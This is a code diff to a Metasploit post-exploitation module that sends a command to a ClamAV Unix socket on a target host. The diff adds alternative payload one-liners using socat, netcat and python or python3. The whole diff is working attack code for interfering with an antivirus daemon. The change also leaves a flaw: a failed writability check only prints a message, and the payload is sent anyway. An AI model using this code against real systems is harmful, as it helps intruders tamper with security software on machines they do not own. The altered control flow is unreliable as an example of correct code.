@@ -43,18 +43,25 @@ class MetasploitModule < Msf::Post
 
     if command_exists?('socat')
       print_good('socat exists')
+      payload = "echo #{cmd} | socat - UNIX-CONNECT:#{clamav_socket}"
+    elsif command_exists?('nc')
+      print_good('nc exists')
+      payload = "echo #{cmd} | nc -U #{clamav_socket}"
+    elsif command_exists?('python')
+      print_good('python exists')
+      payload = "python -c \"import socket; sock = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM); sock.connect('#{clamav_socket}'); sock.send('#{cmd}'.encode());\""
+    elsif command_exists?('python3')
+      print_good('python3 exists')
+      payload = "python3 -c \"import socket; sock = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM); sock.connect('#{clamav_socket}'); sock.send('#{cmd}'.encode());\""
     else
-      print_bad('socat does not exist on target host. Quitting!')
+      print_bad('Neither socat, nc, python or python3 exist on the target host. Quitting!')
       return
     end
 
     print_status("Checking file path #{clamav_socket} exists and is writable... ")
-    if writable?(clamav_socket.to_s)
-      print_good('File does exist and is writable!')
-      print_good("Sending #{cmd}...")
-      cmd_exec("echo #{cmd} | socat - UNIX-CONNECT:#{clamav_socket}")
-    else
-      print_bad('File does NOT exist or is not writable!')
-    end
+    print_bad('File does NOT exist or is not writable!') unless writable?(clamav_socket.to_s)
+    print_good('File does exist and is writable!')
+    print_good("Sending #{cmd}...")
+    cmd_exec(payload)
   end
 end
